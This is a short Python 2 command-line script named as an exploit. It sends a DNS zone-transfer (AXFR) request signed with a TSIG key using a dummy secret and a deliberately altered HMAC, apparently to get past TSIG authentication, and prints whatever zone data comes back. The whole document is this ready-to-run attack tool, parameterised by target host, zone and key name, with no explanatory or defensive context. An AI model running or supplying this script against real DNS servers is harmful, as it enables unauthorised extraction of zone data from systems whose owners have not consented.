import dns.query
import dns.zone
import dns.tsigkeyring
import dns.tsig
import dns.message
import dns.update
from time import time, sleep
from struct import pack

def exploit(host, zone, keyname):
    keyring = dns.tsigkeyring.from_text({
        keyname: 'bla'.encode('base64')
    })
    trigger = dns.message.make_query(zone, dns.rdatatype.AXFR)
    trigger.use_tsig(keyring, keyname=keyname, algorithm=dns.tsig.HMAC_SHA256)
    trigger.request_hmac = 'bla' # alter the hmac
    print '[+] sending trigger request'
    ans = dns.query.tcp(trigger, host)
    print ans.to_text()

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('zone')
    p.add_argument('keyname')
    o = p.parse_args()

    exploit(o.host, o.zone, o.keyname)